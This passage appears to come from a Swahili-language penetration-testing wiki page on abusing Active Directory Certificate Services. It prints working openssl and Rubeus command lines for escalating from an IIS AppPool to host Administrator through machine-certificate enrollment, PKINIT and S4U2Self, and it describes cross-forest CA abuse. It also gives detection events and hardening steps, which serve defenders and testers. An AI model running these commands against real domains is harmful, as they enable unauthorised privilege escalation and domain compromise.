**Operational notes:**

- PoC inahitaji **root** kwa sababu inafunga **privileged ports** `389` na `445`.
- Exploitation iliyofanikiwa huandika **DC `.pfx`** na **Kerberos `.ccache`** locally.
- Kwa sababu certificate inahusishwa na **Domain Controller account**, hatua zinazofuata zinaweza kujumuisha **certificate-based Kerberos auth**, **DCSync**, na kutumia tena **machine NT hash** iliyopatikana.<sup>[[2]](#references)</sup>

## Usajili wa mashine wa IIS AppPool hadi Administrator wa host hiyo hiyo

IIS pool inayoendeshwa kama `ApplicationPoolIdentity` hutumia **computer account** ya host yake kwa outbound access kwenye network resources. Kwa hiyo, code execution kama `IIS AppPool\<POOL>` hubaki na low-privileged local token, lakini inaweza kutuma AD CS request ambayo CA hui-authenticate kama `HOST$`; huu ni outbound identity transition, si token impersonation wala local elevation ya mtindo wa Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Chain hii inahitaji IIS host iliyounganishwa kwenye domain, Enterprise CA inayofikika kupitia RPC, machine-authentication template iliyochapishwa ambayo computer ina enrollment rights, PKINIT support, na KDC/SMB reachability. Custom pool identity hubadilisha outbound principal, kwa hiyo thibitisha kuwa pool inatumia `ApplicationPoolIdentity` kabla ya kudhani ni `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Attacker-controlled-key enrollment

Tengeneza key pair na CSR mbali na IIS server na uhifadhi private key. Tuma **CSR pekee** kutoka kwa compromised worker. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) huanzisha `CertificateAuthority.Request`, huweka `CertificateTemplate:Machine`, huita `ICertRequest::Submit`, na kurudisha issued certificate. Tumia CA configuration string `CAHOST\CA-NAME`; template ya kawaida ya `Machine` hujenga subject kutoka AD, hivyo requester-supplied subject/SAN data haihitajiki.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Unganisha certificate iliyorejeshwa na **matching retained key**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` hufanya kazi tu wakati Windows tayari inaweza kuhusisha certificate na private key inayoweza kufikiwa; kwa PEM files zilizotenganishwa, tengeneza PKCS#12 explicitly:<sup>[[19]](#references)[[23]](#references)</sup>
```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
-out machine_cert.pfx -name 'HOST$'
```
Tumia PFX kwa PKINIT na uhifadhi computer TGT iliyorejeshwa kama base64 badala ya kui-inject mara moja:<sup>[[5]](#references)[[19]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
/password:PFX_PASSWORD /nowrap
```
### S4U2Self pamoja na ubadilishaji wa service kwenye host hiyo hiyo

S4U2Self huwezesha service kupata ticket **kwa ajili yake yenyewe** iliyo na authorization data ya user mwingine. Kwa kutumia computer TGT, Rubeus inaweza kuomba ticket hiyo kwa user mwenye privileged, kubadilisha service name katika KRB-CRED iliyorejeshwa kuwa CIFS, na kui-inject. Hii ndiyo primitive ya local “delegate to thyself”: haihitaji S4U2Proxy au entry ya `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>
```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
/altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```
Tiketi iliyobadilishwa inaweza kutumiwa tu na services zilizo kwenye **computer account/key ileile** (hapa, CIFS kwenye `HOST`). Si tiketi ya Administrator inayoweza kutumiwa tena kwenye mashine nyingine za domain. Pia, matokeo yaliyoonyeshwa ni ufikiaji wa SMB/filesystem wenye privileges kama Administrator; kupata process ya ndani ya `NT AUTHORITY\SYSTEM` bado kunahitaji hatua tofauti ya remote-execution.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Detection and hardening

- Kwenye CA, linganisha matukio ya Certification Services **4886** (request imepokelewa) na **4887** (imetolewa) kwa maombi yasiyotarajiwa ya template ya `Machine` yanayofanywa na akaunti za IIS server.<sup>[[19]](#references)[[24]](#references)</sup>
- Kwenye DCs, tukio la **4768** hujumuisha certificate fields wakati certificate pre-authentication inatumiwa; weka alert kwa maombi yasiyo ya kawaida ya PKINIT TGT kwa akaunti za web-server. Fuatilia kwa maombi ya **4769** yanayohusisha identity yenye privileges iliyo-impersonate na host ileile. Kwa sababu Rubeus `/altservice` huandika upya jina la service la KRB-CRED client-side, usihitaji jina la service la 4769 upande wa DC liwe `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Tafuta `w3wp.exe` inayofikia CA RPC endpoints, uundaji usiotarajiwa wa ASPX, ufikiaji wa administrative shares uliothibitishwa kwa Kerberos, na shughuli za secrets-dumping. Zuia app-tier kufikia CA RPC/KDC/SMB inapowezekana na uondoe computer enrollment rights au machine-authentication templates ambazo hazihitajiki kiutendaji.<sup>[[19]](#references)</sup>

## Compromising Forests with Certificates Imeelezwa kwa Passive Voice

### Kuvunjwa kwa Forest Trusts na CAs Zilizoathiriwa

Usanidi wa **cross-forest enrollment** hufanywa kuwa mwepesi kwa kiasi. **Root CA certificate** kutoka resource forest **huchapishwa kwenye account forests** na administrators, na certificates za **enterprise CA** kutoka resource forest **huongezwa kwenye containers za `NTAuthCertificates` na AIA katika kila account forest**. Kwa ufafanuzi, mpangilio huu huipa **CA iliyo kwenye resource forest udhibiti kamili** juu ya forests nyingine zote ambazo inasimamia PKI. Ikiwa CA hii **itaathiriwa na attackers**, certificates za users wote katika resource forest na account forests zinaweza **kutengenezwa bandia nao**, hivyo kuvunja security boundary ya forest.<sup>[[6]](#references)</sup>

### Enrollment Privileges Zilizopewa Foreign Principals

Katika mazingira ya multi-forest, tahadhari inahitajika kuhusu Enterprise CAs ambazo **huchapisha certificate templates** zinazoruhusu **Authenticated Users au foreign principals** (users/groups walio nje ya forest ambayo Enterprise CA ni mali yake) kuwa na **enrollment na edit rights**.\
Baada ya authentication kupitia trust, **Authenticated Users SID** huongezwa kwenye token ya user na AD. Kwa hiyo, ikiwa domain ina Enterprise CA yenye template ambayo **inaruhusu Authenticated Users enrollment rights**, template inaweza **kuombewa enrollment na user kutoka forest tofauti**. Vilevile, ikiwa **enrollment rights zimetolewa wazi kwa foreign principal na template**, **cross-forest access-control relationship huundwa**, na kumwezesha principal kutoka forest moja **kuomba enrollment kwenye template kutoka forest nyingine**.

Hali zote mbili husababisha **kuongezeka kwa attack surface** kutoka forest moja hadi nyingine. Settings za certificate template zinaweza kutumiwa vibaya na attacker ili kupata privileges za ziada katika foreign domain.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Uchambuzi wa kiufundi wa Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blogu ya SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Kutumia Vibaya Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, Authentication na Request Methods Mpya na zaidi](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Kutumia Vibaya Key Trust Account Mapping kwa Account Takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Hadithi ya Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Ku-relay kwenye AD Certificate Services kupitia RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access kwenye ADCS CA yenye YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Si ESC nyingine tu ya AD CS](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration na Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Kutathmini Tena “Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS enrollment PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Privilege Escalation kutoka IIS AppPool kupitia AD CS RPC Endpoint](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Application Pool Identities](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 command](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Audit Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Event 4768: Tiketi ya Kerberos authentication iliombwa](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Event 4769: Tiketi ya Kerberos service iliombwa](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
{{#include ../../../banners/hacktricks-training.md}}
